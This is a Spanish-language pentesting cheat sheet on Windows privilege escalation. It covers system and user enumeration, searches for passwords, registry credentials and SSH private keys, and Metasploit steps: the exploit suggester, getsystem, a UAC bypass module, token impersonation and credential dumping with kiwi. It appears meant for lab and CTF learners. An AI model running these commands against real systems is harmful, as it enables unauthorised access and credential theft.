# Escalada de privilegios en Windows

## 🔹 Enumeración del Sistema

```bash
systeminfo # Información detallada del sistema operativo y parches instalados.
wmic os get Caption, Version, BuildNumber # Versión del sistema operativo.
hostname # Nombre del host.
env # Variables de entorno.
```

## 🔹 Información de Usuario y Grupos

```bash
whoami # Identificar usuario actual.
whoami /priv # Privilegios del usuario actual.
whoami /groups # Grupos a los que pertenece el usuario.
net user # Lista de usuarios del sistema.
net localgroup Administradores # Usuarios con privilegios de administrador.
dir C:\Users # Directorios de usuarios.
history # Historial de comandos en PowerShell.
```

## 🔍 Archivos y Directorios Sensibles

```
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent  # Archivos recientes
dir /s /b C:\Users\*\Documents\  # Documentos del usuario
dir /s /b C:\Users\*\Desktop\  # Escritorio de los usuarios
dir /s /b C:\Windows\System32\config  # Archivos de configuración
```

## 🔹 Información de Red

```bash
ipconfig /all # Muestra interfaces de red y configuración IP.
netstat -ano # Conexiones activas y puertos abiertos.
route print # Tabla de enrutamiento.
type C:\Windows\System32\drivers\etc\hosts # Configuración DNS.
arp -a # Tabla ARP.
sc query # ver los servicios existentes del sistema.
```

## 🔹 Buscar archivos.

```bash
find /s file # para buscar en el sistema con X nombre (user.txt | passwords.xml | *.txt).
findstr /si password *.<extensión> # .txt,xml,ini,etc.
dir /s /b /a "C:\Users\*pass*.txt" "C:\Users\*pass*.xml" "C:\Users\*pass*.ini"
```

## 🔹bash**Exploit Suggester** con Metasploit.

Una vez hayamos comprometido la máquina haremos lo siguiente:

```bash
msfconsole -q # Abrimos Metasploit en modo silencioso.
search local_exploit_suggeste # Busca el exploit.
use 0 # Seleccionamos el exploit, Este módulo analizará el sistema y proporcionará una lista de exploits recomendados basados en vulnerabilidades conocidas.
options # Vemos las opciones.
set SESSION 1 # Comprobamos nuestra sesión con sessions -l
run
```

Una vez que lancemos el exploit, nos saldrá una lista de posibles escalada de privilegios y tenemos que ir comprobando cual se ajusta a nuestras necesidades y nos funciona.

<figure><img src="https://989702460-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FemJOyEYVJus1nA7uz2Rc%2Fuploads%2F9QyacMs2T9h8lq10ogLh%2Fprviesc.png?alt=media&#x26;token=5ecf0219-7026-40ae-8aec-f443900f83cd" alt=""><figcaption></figcaption></figure>

## Explotación del Kernel

```bash
systeminfo | findstr /B /C:"OS Version"  # Verificar versión del sistema operativo
wmic qfe get HotFixID  # Listar parches instalados
```

Consultar la siguiente web para exploits conocidos: [https://www.exploit-db.com/](https://www.exploit-db.com/)

## Búsqueda de Credenciales

```bash
findstr /si password *.txt *.ini *.config  # Buscar contraseñas en archivos de configuración
reg query HKLM /f password /t REG_SZ /s  # Buscar credenciales en el registro
```

## 🔍 Análisis de Historial

```
type C:\Users\<usuario>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  # Historial de comandos de PowerShell
type C:\Users\<usuario>\ntuser.dat.LOG1  # Registro de actividad del usuario
```

## 🔍 Buscar Claves SSH

```
dir /s /b C:\Users\*.ssh\id_rsa  # Buscar claves privadas SSH
dir /s /b C:\Users\*.ssh\authorized_keys  # Claves autorizadas
```

## 🔍 Configuraciones SUID/SGID (Equivalente a Windows: Archivos con permisos elevados)

```
icacls C:\Windows\System32  # Ver permisos de archivos del sistema
icacls C:\Users\<usuario> /grant Everyone:F  # Modificar permisos (requiere privilegios elevados)
```

## 🔍 Tareas Programadas

```
schtasks /query /fo LIST /v  # Listar tareas programadas
dir C:\Windows\Tasks  # Ver tareas programadas manualmente
dir C:\Windows\System32\Tasks  # Tareas programadas por el sistema
```

## 🔍 Servicios y Configuraciones Sensibles

```
wmic service list brief  # Listar servicios en ejecución
net start  # Ver servicios iniciados
Get-WmiObject Win32_Service | Select-Object Name, StartName  # Ver servicios con cuentas privilegiadas
```

## 🔍 Archivos de Configuración de Tareas Programadas

```
dir /s /b C:\Windows\System32\Tasks  # Listar tareas programadas
dir /s /b C:\Windows\Tasks  # Listar tareas ocultas
```



### Escalada de privilegios con metasploit&#x20;



```
getsystem
```



#### bypassing UAC



```
use windows/local/bypassuac_injection
set TARGET Windows\ x64
```

#### Token impersonation

tenemos que tener el privilegio de SeImpersontaPrivilege cuando corremos el comando getprivs

```bash
getprivs
load incognito
list_tokens -u # nos dara una lista de los token disponibles
impersonate_token "<token>"
#normalmente en este punto tendremos que migrar a un proceso diferente
migrate <id proceso> ## puede ser explorer.exe
```

#### dumping credentials con kiwi

```
load kiwi
creds_all
```

